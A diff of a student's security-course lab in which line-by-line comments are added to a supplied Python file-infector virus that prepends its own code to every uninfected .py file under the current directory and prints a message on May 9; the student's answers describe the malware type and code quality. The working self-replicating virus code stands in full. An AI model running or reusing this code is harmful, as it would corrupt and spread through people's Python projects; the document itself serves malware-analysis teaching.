@@ -24,62 +24,89 @@ SIGNATURE = "VIRUS"
 def locate(path):
     # Variable given an empty list to begin with
     files_targeted = []
-    # 
+    # Retrieve files within specified path
     filelist = os.listdir(path)
+    # Loop to run commands in the filelist
     for fname in filelist:
+        # Check path, if true execute
         if os.path.isdir(path+"/"+fname):
+            # List on path extends new elements to the file
             files_targeted.extend(locate(path+"/"+fname))
+        # alternative condition, if true files end in .py, execute code block
         elif fname[-3:] == ".py":
+            # default infected is false
             infected = False
+            # loop and look in each line of file
             for line in open(path+"/"+fname):
+                # look for the signature virus line
                 if SIGNATURE in line:
+                    # to check if virus is on the file
                     infected = True
+                    # exit
                     break
+            # to check if virus is not on the file
             if infected == False:
+                # the file path is added to the file target
                 files_targeted.append(path+"/"+fname)
+    # exit current function
     return files_targeted
-
+# A function to infect the locate function above
 def infect(files_targeted):
+    # Open the virus script
     virus = open(os.path.abspath(__file__))
+    # variable is empty
     virusstring = ""
+    # Process each line in the virus script file 
     for i,line in enumerate(virus):
+        # if line is greater than 0 but less than 39
         if 0 <= i < 39:
+            # add virus to the line
             virusstring += line
+    # close the virus string
     virus.close
+    # loop and perform a set of actions
     for fname in files_targeted:
+        # open to read file
         f = open(fname)
+        # place the current file into a temp variable
         temp = f.read()
+        # close the file
         f.close()
+        # open and write file
         f = open(fname,"w")
+        # write the viure string onto the temp file
         f.write(virusstring + temp)
+        # close the file
         f.close()
-
+# For when function is called perform block of code
 def detonate():
+    # If the date is May 9
     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        #execute print statement
         print("You have been hacked")
-
+# Target files in current directory of virus script
 files_targeted = locate(os.path.abspath(""))
+# Infect the target files
 infect(files_targeted)
+# Run the detonate function
 detonate()
 
 
 
-# Perform an analysis of the Python-based code.
-#                            
-#                            Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
-#                            Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
-#                            Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
-#                            Stretch Goals (Optional Objectives)
-#                            Pursue stretch goals if you are a more advanced user or have remaining lab time.
-#                            
-#                            In your submission, include comments towards the bottom explaining the below:
-#                            
-#                            Identify all the core Python/coding tools used by this script, e.g. functions.
-#                            What kind of malware is this? Define this type of malware in your own words.
-#                            How well is this code written? Would you have done something differently to achieve the same objective?
-#                            Submission Instructions
-#                            When you are ready to submit your shell script for grading, ACP it from VS Code to your public GitHub repository. Name the file according to your course code and assignment, e.g. ops-301d1: Challenge 01.
-#                            Copy the URL to your GitHub file and paste below as your submission. Add a comment in your Canvas assignment which includes the following:
-#                            A question within the context of today’s lab assignment
-#                            An observation about the lab assignment, or related ‘Ah-hah!’ moment
-#                            How long you spent working on this assignment
+# Perform an analysis of the Python-based code.                        
+#   Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
+#   Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
+#   Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
+#   Stretch Goals (Optional Objectives)
+#   Pursue stretch goals if you are a more advanced user or have remaining lab time.
+#   
+#   In your submission, include comments towards the bottom explaining the below:
+#   
+#   Identify all the core Python/coding tools used by this script, e.g. functions.
+#   1. What kind of malware is this? Define this type of malware in your own words.
+#       It is a malware that only infects files that end in .py extention (python) and it is to be executed on the date of May 9
+
+#   2. How well is this code written? Would you have done something differently to achieve the same objective?
+#       I think this code is not 100% great it didnt properly close the read and write files
+#   3. How long you spent working on this assignment
+#       Only took me around an hour to download the appropriate programming language and code editors and have everything in a contained vm enviroment
